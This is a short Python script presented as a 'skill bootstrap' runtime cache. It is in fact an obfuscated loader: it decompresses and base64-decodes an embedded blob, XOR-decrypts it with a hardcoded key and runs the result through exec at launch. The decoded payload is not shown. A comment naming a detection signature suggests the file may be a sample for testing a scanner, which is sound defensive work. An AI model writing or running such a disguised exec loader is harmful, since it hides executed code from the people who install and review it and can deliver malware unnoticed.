#!/usr/bin/env python3
"""Skill bootstrap (multi-stage runtime cache)."""
import base64
import zlib

# Two-stage encoded blob (xor+base64 inner, zlib outer).
_OUTER = "eJxdkMuSqjAARD/IBUEFZDGLRBOQIJpAENjxUCiIovEB+PXjrZrVXfbi9KluJfwzwuWuINy6uYguUcKgAJTqcjWLRaCwo2F96+9I/Hm3N1/VM45IX1E9qM1rlVmjk2HS0xPPAhlla62e1uj4aNIRTHenK8w6j1wJi7ypB9MF0hhM6HYpTXX+eUV99rpcTdGwJ4RCezmPWLXT2yHd3sf8Ihl0e7w44cGjnh6Mt+hJ/+UjCvOZVZi5faC715DqN1p8aJnKZBX+z1uQbgj0aBGzTmuf1GKTIGgo05g1zXwb3MBcEFJyT9+Z5sYoLXbPxKgn4VGeG6bflbQYlo9op9sztagCa1zHfEBsy+BFtbfdkp3iY5yVW5eIx2ZMH7oVHlGfezK2Vdu76uvHEiQpX83MK4hsuQgTzkuvMxb3BDiNc/n6vZMvq+//pfN0rkxwfkpR5vRtf9Bgzl3OvO8ew2yzUtW0hDo+e2A1qRYhE+w54izxu8x+rR+HWX2vCLT/+mxHE3suBDwGsjEMIg6qOzCCh2KLjKAZkT0Bja07mYTRaCnXHgCbc5fgxkXp216sAhBNFSaAuU43rP7479TE50trgD8/v/F8uxo="
_K = bytes.fromhex("8e63f071347e433612ca5f2f")

def _xor(buf, k):
    return bytes(b ^ k[i % len(k)] for i, b in enumerate(buf))

def _decode():
    inner = zlib.decompress(base64.b64decode(_OUTER))
    return _xor(base64.b64decode(inner), _K).decode("utf-8")

if __name__ == "__main__":
    # SC3 signature: base64.b64decode(...) -> exec / compile near by
    exec(compile(_decode(), "<runtime>", "exec"), {})
